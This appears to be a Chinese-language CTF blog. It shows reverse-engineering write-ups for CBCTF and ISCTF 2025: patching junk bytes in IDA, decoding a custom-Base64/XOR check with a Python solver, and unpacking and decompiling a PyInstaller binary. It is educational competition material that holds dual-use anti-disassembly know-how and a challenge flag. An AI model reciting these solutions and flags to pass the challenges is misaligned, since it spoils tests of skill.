<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.text:004011E7 74 02                             jz      short loc_4011EB</span><br><span class="line">.text:004011E7</span><br><span class="line">.text:004011E9 EB 02                             jmp     short near ptr loc_4011EB+2</span><br><span class="line">.text:004011E9</span><br><span class="line">.text:004011EB                                   ; ---------------------------------------------------------------------------</span><br><span class="line">.text:004011EB</span><br><span class="line">.text:004011EB                                   loc_4011EB:                             ; CODE XREF: .text:004011E7↑j</span><br><span class="line">.text:004011EB                                                                           ; .text:004011E9↑j</span><br><span class="line">.text:004011EB E8 FF 68 00 E0                    call    near ptr 0E0407AEFh</span><br><span class="line">.text:004011EB</span><br></pre></td></tr></table></figure>
<p>+2，把11EB的前两个字节nop掉</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">.text:004011E7 74 02                             jz      short loc_4011EB</span><br><span class="line">.text:004011E7</span><br><span class="line">.text:004011E9 EB 02                             jmp     short near ptr unk_4011ED</span><br><span class="line">.text:004011E9</span><br><span class="line">.text:004011EB                                   ; ---------------------------------------------------------------------------</span><br><span class="line">.text:004011EB</span><br><span class="line">.text:004011EB                                   loc_4011EB:                             ; CODE XREF: .text:004011E7↑j</span><br><span class="line">.text:004011EB 90                                nop</span><br><span class="line">.text:004011EC 90                                nop</span><br><span class="line">.text:004011EC</span><br><span class="line">.text:004011EC                                   ; ---------------------------------------------------------------------------</span><br><span class="line">.text:004011ED 68                                unk_4011ED db  68h ; h                  ; CODE XREF: .text:004011E9↑j</span><br><span class="line">.text:004011EE 00                                db    0 ; OFF32 SEGDEF [_data,41E000]</span><br><span class="line">.text:004011EF E0                                db 0E0h</span><br></pre></td></tr></table></figure>
<p>根据跳转提示，在11ED处C，转成代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">.text:004011E7 74 02                             jz      short loc_4011EB</span><br><span class="line">.text:004011E7</span><br><span class="line">.text:004011E9 EB 02                             jmp     short loc_4011ED</span><br><span class="line">.text:004011E9</span><br><span class="line">.text:004011EB                                   ; ---------------------------------------------------------------------------</span><br><span class="line">.text:004011EB</span><br><span class="line">.text:004011EB                                   loc_4011EB:                             ; CODE XREF: .text:004011E7↑j</span><br><span class="line">.text:004011EB 90                                nop</span><br><span class="line">.text:004011EC 90                                nop</span><br><span class="line">.text:004011EC</span><br><span class="line">.text:004011ED</span><br><span class="line">.text:004011ED                                   loc_4011ED:                             ; CODE XREF: .text:004011E9↑j</span><br><span class="line">.text:004011ED 68 00 E0 41 00                    push    offset aEnterInput              ; &quot;Enter input: &quot;</span><br><span class="line">.text:004011ED</span><br><span class="line">.text:004011ED                                   ; ---------------------------------------------------------------------------</span><br><span class="line">.text:004011F2 E8                                db 0E8h</span><br></pre></td></tr></table></figure>
<p>此时还无法创建函数，11F2处有未识别指令，直接C，此时可以创建函数了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_4011C0</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> _FuxNFb_$QXR_Xe__F_lqZ[_T@Q&amp;&amp;_; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> __r_n_; <span class="comment">// [esp+14h] [ebp-114h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> p_i; <span class="comment">// [esp+18h] [ebp-110h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [esp+1Ch] [ebp-10Ch]</span></span><br><span class="line">  LPVOID lpMem; <span class="comment">// [esp+20h] [ebp-108h]</span></span><br><span class="line">  <span class="type">char</span> FuxNFb_$QXR_Xe__F_lqZ[_T@Q&amp;&amp;[<span class="number">256</span>]; <span class="comment">// [esp+24h] [ebp-104h] BYREF</span></span><br><span class="line"></span><br><span class="line">  sub_401440(Enter_input__);                    <span class="comment">// &quot;Enter input: &quot;</span></span><br><span class="line">  v0 = sub_4059A8(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( sub_405B85(FuxNFb_$QXR_Xe__F_lqZ[_T@Q&amp;&amp;, <span class="number">256</span>, v0) )</span><br><span class="line">  &#123;</span><br><span class="line">    __r_n_ = sub_4079B0(FuxNFb_$QXR_Xe__F_lqZ[_T@Q&amp;&amp;, r_n);<span class="comment">// &quot;\r\n&quot;</span></span><br><span class="line">    <span class="keyword">if</span> ( __r_n_ &gt;= <span class="number">0x100</span> )</span><br><span class="line">      sub_40159D();</span><br><span class="line">    FuxNFb_$QXR_Xe__F_lqZ[_T@Q&amp;&amp;[__r_n_] = <span class="number">0</span>;</span><br><span class="line">    p_i = <span class="number">0</span>;</span><br><span class="line">    v3 = sub_407A00(FuxNFb_$QXR_Xe__F_lqZ[_T@Q&amp;&amp;);</span><br><span class="line">    lpMem = (LPVOID)sub_401000(FuxNFb_$QXR_Xe__F_lqZ[_T@Q&amp;&amp;, v3, &amp;p_i);</span><br><span class="line">    <span class="keyword">if</span> ( lpMem )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; p_i; ++i )</span><br><span class="line">        *((_BYTE *)lpMem + i) ^= <span class="number">0x16u</span>;</span><br><span class="line">      _FuxNFb_$QXR_Xe__F_lqZ[_T@Q&amp;&amp;_ = sub_407A00(aFuxnfbQxrXeFLq);<span class="comment">// &quot;FuxNFb|$QXR#Xe#&#125;F#lqZ[`T@Q&amp;&amp;&quot;</span></span><br><span class="line">      <span class="keyword">if</span> ( p_i != _FuxNFb_$QXR_Xe__F_lqZ[_T@Q&amp;&amp;_ || sub_4021DB(</span><br><span class="line">                                                      lpMem,</span><br><span class="line">                                                      aFuxnfbQxrXeFLq,<span class="comment">// &quot;FuxNFb|$QXR#Xe#&#125;F#lqZ[`T@Q&amp;&amp;&quot;</span></span><br><span class="line">                                                      p_i) )</span><br><span class="line">      &#123;</span><br><span class="line">        sub_401440(aFail);                      <span class="comment">// &quot;fail\n&quot;</span></span><br><span class="line">        sub_401440(a99s);                       <span class="comment">// &quot;%99s&quot;</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        sub_401440(aSuccess);                   <span class="comment">// &quot;success\n&quot;</span></span><br><span class="line">      &#125;</span><br><span class="line">      sub_407990(lpMem);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v4 = sub_4059A8(<span class="number">2</span>);</span><br><span class="line">      sub_401400(v4, aMemoryError);             <span class="comment">// &quot;Memory error\n&quot;</span></span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v1 = sub_4059A8(<span class="number">2</span>);</span><br><span class="line">    sub_401400(v1, Memory_error_n);             <span class="comment">// &quot;Read error\n&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>401000:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">sub_401000</span><span class="params">(_BYTE *FuxNFb_$QXR_Xe__F_lqZ[_T@Q&amp;&amp;, <span class="type">unsigned</span> <span class="type">int</span> a2, <span class="type">unsigned</span> <span class="type">int</span> *p_i)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> n61_1; <span class="comment">// [esp+Ch] [ebp-24h]</span></span><br><span class="line">  <span class="type">char</span> n61; <span class="comment">// [esp+10h] [ebp-20h]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [esp+14h] [ebp-1Ch]</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [esp+18h] [ebp-18h]</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [esp+1Ch] [ebp-14h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v9; <span class="comment">// [esp+20h] [ebp-10h]</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// [esp+24h] [ebp-Ch]</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// [esp+28h] [ebp-8h]</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// [esp+28h] [ebp-8h]</span></span><br><span class="line">  <span class="type">int</span> v13; <span class="comment">// [esp+28h] [ebp-8h]</span></span><br><span class="line">  <span class="type">int</span> v14; <span class="comment">// [esp+28h] [ebp-8h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v15; <span class="comment">// [esp+2Ch] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  *p_i = <span class="number">4</span> * ((a2 + <span class="number">2</span>) / <span class="number">3</span>);</span><br><span class="line">  v10 = sub_4079A0(*p_i + <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v10 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  v15 = <span class="number">0</span>;</span><br><span class="line">  v11 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( v15 &lt; a2 )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = (<span class="type">unsigned</span> __int8)FuxNFb_$QXR_Xe__F_lqZ[_T@Q&amp;&amp;[v15];</span><br><span class="line">    <span class="keyword">if</span> ( ++v15 &gt;= a2 )</span><br><span class="line">      v7 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      v7 = (<span class="type">unsigned</span> __int8)FuxNFb_$QXR_Xe__F_lqZ[_T@Q&amp;&amp;[v15++];</span><br><span class="line">    <span class="keyword">if</span> ( v15 &gt;= a2 )</span><br><span class="line">      v6 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      v6 = (<span class="type">unsigned</span> __int8)FuxNFb_$QXR_Xe__F_lqZ[_T@Q&amp;&amp;[v15++];</span><br><span class="line">    v9 = v6 | (v7 &lt;&lt; <span class="number">8</span>) | (v8 &lt;&lt; <span class="number">16</span>);</span><br><span class="line">    *(_BYTE *)(v11 + v10) = byte_417180[(v9 &gt;&gt; <span class="number">18</span>) &amp; <span class="number">0x3F</span>];</span><br><span class="line">    v12 = v11 + <span class="number">1</span>;</span><br><span class="line">    *(_BYTE *)(v12 + v10) = byte_417180[(v9 &gt;&gt; <span class="number">12</span>) &amp; <span class="number">0x3F</span>];</span><br><span class="line">    v13 = v12 + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v15 &lt;= a2 + <span class="number">1</span> )</span><br><span class="line">      n61 = byte_417180[(v9 &gt;&gt; <span class="number">6</span>) &amp; <span class="number">0x3F</span>];</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      n61 = <span class="number">61</span>;</span><br><span class="line">    *(_BYTE *)(v13 + v10) = n61;</span><br><span class="line">    v14 = v13 + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v15 &lt;= a2 )</span><br><span class="line">      n61_1 = byte_417180[v9 &amp; <span class="number">0x3F</span>];</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      n61_1 = <span class="number">61</span>;</span><br><span class="line">    *(_BYTE *)(v14 + v10) = n61_1;</span><br><span class="line">    v11 = v14 + <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  *(_BYTE *)(v10 + *p_i) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> v10;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>注意自定义base64字符集</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.rdata:00417180                                   ; char byte_417180[]</span><br><span class="line">.rdata:00417180 30                                byte_417180 db 30h                      ; DATA XREF: sub_401000+FF↑r</span><br><span class="line">.rdata:00417180                                                                           ; sub_401000+11F↑r</span><br><span class="line">.rdata:00417180                                                                           ; sub_401000+14D↑r</span><br><span class="line">.rdata:00417180                                                                           ; sub_401000+182↑r</span><br><span class="line">.rdata:00417181 31 32 33 34 35 36 37 38 39 41…    a123456789abcde db &#x27;123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz+/&#x27;,0</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="comment"># 自定义 Base64 表</span></span><br><span class="line">custom_table = <span class="string">&quot;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz+/&quot;</span></span><br><span class="line"><span class="comment"># 标准 Base64 表</span></span><br><span class="line">standard_table = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span></span><br><span class="line"></span><br><span class="line">target = <span class="string">&quot;FuxNFb|$QXR#Xe#&#125;F#lqZ[`T@Q&amp;&amp;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. XOR 解密 (XOR 0x16)</span></span><br><span class="line">xor_decrypted = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> target:</span><br><span class="line">    xor_decrypted += <span class="built_in">chr</span>(<span class="built_in">ord</span>(c) ^ <span class="number">0x16</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;XOR解密后:&quot;</span>, xor_decrypted)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 自定义Base64转标准Base64</span></span><br><span class="line">trans = <span class="built_in">str</span>.maketrans(custom_table, standard_table)</span><br><span class="line">standard_base64 = xor_decrypted.translate(trans)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;转换为标准Base64:&quot;</span>, standard_base64)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. Base64解码</span></span><br><span class="line">padding = <span class="number">4</span> - <span class="built_in">len</span>(standard_base64) % <span class="number">4</span></span><br><span class="line"><span class="keyword">if</span> padding != <span class="number">4</span>:</span><br><span class="line">    standard_base64 += <span class="string">&quot;=&quot;</span> * padding</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    decoded = base64.b64decode(standard_base64)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;解码后的字节:&quot;</span>, decoded)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Flag (ASCII):&quot;</span>, decoded.decode(<span class="string">&#x27;ascii&#x27;</span>))</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;解码错误:&quot;</span>, e)</span><br></pre></td></tr></table></figure>
<p>得到flag{BAsE_and_jUnK}，<strong>CBCTF{BAsE_and_jUnK}</strong></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2025/12/23/competition-wp/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/headimage.jpg">
      <meta itemprop="name" content="Rekjo">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content=" | Hexo">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2025/12/23/competition-wp/" class="post-title-link" itemprop="url">competition_wp</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>
      

      <time title="Created: 2025-12-23 21:51:35 / Modified: 21:55:36" itemprop="dateCreated datePublished" datetime="2025-12-23T21:51:35+08:00">2025-12-23</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>总有师傅因为爱水群把我当佬……</p>
<p>看看萌新小登的成长日记吧：</p>
<p>01 SUSCTF2025（新生赛）2025.9.22-2025.10.6</p>
<p>02 GeekGame2025 2025.10.17-2025.10.24</p>
<p>03 GeekChallenge2025 2025.10.24-2025.11.24</p>
<p>04 ISCTF2025 2025.12.1-2025.12.7 <a target="_blank" rel="noopener" href="https://rekjorekjo.github.io/2025/12/23/ISCTF2025-wp/">https://rekjorekjo.github.io/2025/12/23/ISCTF2025-wp/</a></p>
<p>05 CBCTF2025 2025.9.15-2025.12.15</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2025/12/23/ISCTF2025-wp/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/headimage.jpg">
      <meta itemprop="name" content="Rekjo">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content=" | Hexo">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2025/12/23/ISCTF2025-wp/" class="post-title-link" itemprop="url">ISCTF2025_wp</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>
      

      <time title="Created: 2025-12-23 13:11:43 / Modified: 21:44:13" itemprop="dateCreated datePublished" datetime="2025-12-23T13:11:43+08:00">2025-12-23</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="ISCTF-2025"><a href="#ISCTF-2025" class="headerlink" title="ISCTF 2025"></a>ISCTF 2025</h1><hr>
<p>本次比赛和Rycbartbad师傅一起打了第47名，感觉还是很不错的</p>
<p>加个pwn佬、web佬能起飞</p>
<p><img src="/images/image-2025-12-09-222324.png" alt=""></p>
<p><img src="/images/Score_over_Time.png" alt=""></p>
<p>[TOC]</p>
<p>说明 由于本人web和病毒分析纯ai做法，没有实际价值，不在wp中赘述</p>
<h3 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a><strong>Reverse</strong></h3><p>比赛体量太大，重心没放在reverse上，个人仅做了两个题。</p>
<ul>
<li><p>ELF</p>
<blockquote>
<p>这个elf有点奇怪呢</p>
</blockquote>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">└─# file main</span><br><span class="line">main: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span class="keyword">for</span> GNU/Linux 3.2.0, BuildID[sha1]=f5e4eb9bd95f0a14f41d1ef1a6f8ee703c85a059, stripped</span><br></pre></td></tr></table></figure>
<p>file一下，stripped被剥离了符号表，果然打开ida啥也不是</p>
<p>strings检查发现爆出很多”python”字符串，是<strong>PyInstaller打包的Python程序</strong></p>
<p>用特定脚本解包</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https://raw.githubusercontent.com/extremecoders-re/pyinstxtractor/master/pyinstxtractor.py</span><br><span class="line">python3 pyinstxtractor.py main</span><br></pre></td></tr></table></figure>
<p>反编译,注意不同python版本需要选择不同的工具。</p>
<p>3.1-3.9 uncompyle6</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uncompyle6 -o main.pyc main.py</span><br></pre></td></tr></table></figure>
<p>3.7-3.9 decompyle3</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">decompyle3 main.pyc &gt; main.py</span><br></pre></td></tr></table></figure>
<p>3.1+ or 3.10+</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> pycdc</span><br><span class="line">cmake .</span><br><span class="line">make</span><br><span class="line">./pycdc ../main.pyc &gt; main.py</span><br></pre></td></tr></table></figure>
<p>本题用pycdc得到main.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Source Generated with Decompyle++</span></span><br><span class="line"><span class="comment"># File: main.pyc (Python 3.10)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line">flag = <span class="string">'8d13c398b72151b1dad78762553dbbd59dba9b0b2330b03b401ea4f2a6d4731d479220fe900b520f6b4753667fe1cdf9eff8d3b833a0013c4083fa1ad27d056486702bda245f3c1aa0fbf84b237d8f2dec9a80791fe66625adfe3669419a104cbb67293eaada20f79cebf69d84d326025dd35dec09a2c97ad838efa5beba9e72'</span></span><br><span class="line">YourInput = <span class="built_in">input</span>(<span class="string">'Please input your flag:'</span>)</span><br><span class="line">enc = <span class="string">''</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(YourInput) != <span class="number">24</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">'Length Wrong!!!'</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Rep</span>(<span class="params">hash_data</span>):</span><br><span class="line">    random.seed(<span class="number">161</span>)</span><br><span class="line">    result = <span class="built_in">list</span>(hash_data)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(result) - <span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>):</span><br><span class="line">        swap_index = random.randint(<span class="number">0</span>, i)</span><br><span class="line">        result[i] = result[swap_index]</span><br><span class="line">        result[swap_index] = result[i]</span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join(result)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(YourInput) // <span class="number">3</span>):</span><br><span class="line">    c2b = base64.b64encode(YourInput[i * <span class="number">3</span>:(i + <span class="number">1</span>) * <span class="number">3</span>].encode(<span class="string">'utf-8'</span>))</span><br><span class="line">    <span class="built_in">hash</span> = hashlib.md5(c2b).hexdigest()</span><br><span class="line">    enc += Rep(<span class="built_in">hash</span>)</span><br><span class="line"><span class="keyword">if</span> enc == flag:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">'Your are win!!!'</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"><span class="literal">None</span>(<span class="string">'Your are lose!!!'</span>)</span><br></pre></td></tr></table></figure>
<p>加密流程：</p>
<p>1.24字节的flag分成8组，每组base64加密变为4字节</p>
<p>2.计算hex的md5</p>
<p>3.每组调用rep函数加密</p>
<p>rep函数是<strong>Fisher-Yates 洗牌算法</strong>的逆序版本<a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_61840987/article/details/143226112">洗牌算法（Shuffle Algorithm）Fisher-Yates 洗牌算法详细解读-CSDN博客</a></p>
<p>由于seed=161已知，洗牌的过程可以复现出来。每组三字节，爆破即可</p>
